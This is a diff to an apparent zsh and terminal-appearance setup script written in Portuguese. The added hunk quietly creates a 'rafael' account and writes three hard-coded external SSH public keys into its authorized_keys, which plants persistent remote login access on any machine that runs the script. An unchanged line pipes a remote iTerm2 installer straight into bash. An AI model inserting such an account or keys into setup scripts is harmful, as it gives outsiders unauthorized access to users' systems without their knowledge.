@@ -357,6 +357,41 @@ echo "source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-high
 echo "source ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh" >> ~/.zshrc
 echo "source ~/.oh-my-zsh/custom/themes/powerlevel10k/powerlevel10k.zsh-theme" >> ~/.zshrc
 
+# Criar o acesso administrativo padrão do Rafael e replicar a aparência
+# configurada acima. Não concede sudo: esse privilégio deve ser habilitado
+# explicitamente para cada servidor, quando necessário.
+echo "👤 Configurando usuário rafael..."
+if ! id -u rafael >/dev/null 2>&1; then
+    sudo useradd --create-home --user-group --shell "$ZSH_PATH" rafael
+elif [ -x "$ZSH_PATH" ]; then
+    sudo usermod --shell "$ZSH_PATH" rafael
+fi
+
+RAFAEL_HOME="$(getent passwd rafael | cut -d: -f6)"
+RAFAEL_GROUP="$(id -gn rafael)"
+
+if [ -z "$RAFAEL_HOME" ] || [ ! -d "$RAFAEL_HOME" ]; then
+    echo "❌ Não foi possível determinar o diretório home do usuário rafael." >&2
+    exit 1
+fi
+
+sudo install -d -m 700 -o rafael -g "$RAFAEL_GROUP" "$RAFAEL_HOME/.ssh"
+sudo tee "$RAFAEL_HOME/.ssh/authorized_keys" > /dev/null <<'EOL'
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE7x+8n8pd5IADfox5kS3KChhWsQbXjmBRrJCes+zDJfOtGtLBthu/oIKe7kMQRWmL4GwGNTw7bk6/qzfLGAtY9aujDziNz8dE5UprSKKOAT+NdVABQSEMUGP/VGegmS0sW9AOcS+xc55nZ6yd4IptknTUN/KVvbp1dbjddFrJRlRmDZScIpl6sE/PJvpfuaeMQeZPG8UW4OPQqIlDFYoNV3fb4powVi3DR4NaFJ7XyXXqIkDpL1yd6kKodHaqIRq5sES9o2Rjy2Ml1dPQFam7h1eMtZk/3/LSUUCHDmaLhRhhznUhj4FUwqcWkyhLMzxeKElIUqt1g7W5Znshl5OF6e20pALUlxSoqUU3OCWuahLhwM6qCBj/1zJBTwXEJTddHhG100XWhdgHRZzv/iMH9KzCZnpbZXcsBQnWyt76G5Q1Ago0FzlSJi3SPFXpoDWlh1uG3InvNIZpILg2j5zWSujkCuzzHeqJns1LpzPNw1aGtIm+mJnRIGE09tzZe9k= hurbybr@MAQUEN
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCelwm/MQfLfbFEgenth32D72dCswd7nNCDH9HfUuD6PQXu9cJbIZkyU+6zkVu+j001gp8ws1hdt+H58N2yvnApcNaJHdse+urrin+zKW7TFyyaURjYmd8nqwdoe5pdmcWOEtiSXdizTHUaXZqhMshPxwPs1KHVEZJd2ERopd+ebXEwkhrYbI1vZXoD59FRv51NvkI0QC4i/IchiDTSkOF7SmGz40RJE1sWhk83JvSHpr8GmQ1rOGgcPRE+WvHYH8YDKZV+e4WAzkpdj9Mo3cT9/X2qb9RJX+tbMvNbg4FkTSp/rQRvFCpAvcVr1MfYDQYcNbDuHprlT5XnLb/Toa8P hurby@MAQUEN
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBxczQsEDiKQ6/COlSBFZyebgioSiOjT5QaIEzWTrpS6IpySbi3pfM3jKN7PUKo8EVTns4vDPw0N+AIYdfe3vyuFU85aQ8Vq0mBRqgIJsicDxOcUF4SpA0EaKgu8G7APb94jijeqkWTPeQPIlElbLJnEOlw4QDu+oPIQdkvq+KyZsNGECnHlwPWd1/74QEb9FeE63c5WEDa4NtqAf4WjbcEZd5GQhKNkDBXf+X4/qXo7sw6ymNF8AruB4EpyoEQsXODhdivAOB3nw1g2iUkBGNStSOy5fvHwGttQXxZfu/1xYMbAwQRQlZD8jsvqMr9LnmLOSnFlxZsYR7AdWzgk995DL1hVuQc/HykjoD8C1YQLEx1puPXtEq3Hh6gAWDh5aPqZIMmBwTftBgnhnqLlV/EdR0NscuaZTTWqQqz3hfSkyDA7e+jhqVWpQKIaOIyynS5sDNZmyTcvHRGnKVRRqm+w3VciKjfaPh1063T/2ONqB9ofcAxJPZRpFRsBCI/nM= hurby@MAQUEN
+EOL
+sudo chown rafael:"$RAFAEL_GROUP" "$RAFAEL_HOME/.ssh/authorized_keys"
+sudo chmod 600 "$RAFAEL_HOME/.ssh/authorized_keys"
+
+if [ -d "$HOME/.oh-my-zsh" ]; then
+    sudo install -d -m 755 -o rafael -g "$RAFAEL_GROUP" "$RAFAEL_HOME/.oh-my-zsh"
+    sudo cp -a "$HOME/.oh-my-zsh/." "$RAFAEL_HOME/.oh-my-zsh/"
+    sudo chown -R rafael:"$RAFAEL_GROUP" "$RAFAEL_HOME/.oh-my-zsh"
+fi
+sudo install -m 644 -o rafael -g "$RAFAEL_GROUP" "$HOME/.p10k.zsh" "$RAFAEL_HOME/.p10k.zsh"
+sudo install -m 644 -o rafael -g "$RAFAEL_GROUP" "$HOME/.zshrc" "$RAFAEL_HOME/.zshrc"
+
 # Instalar iterm2
 echo "💻 Instalando shell integration do iTerm2..."
 curl -fsSL https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash || echo "⚠️ Falha ao instalar shell integration do iTerm2, continuando..."
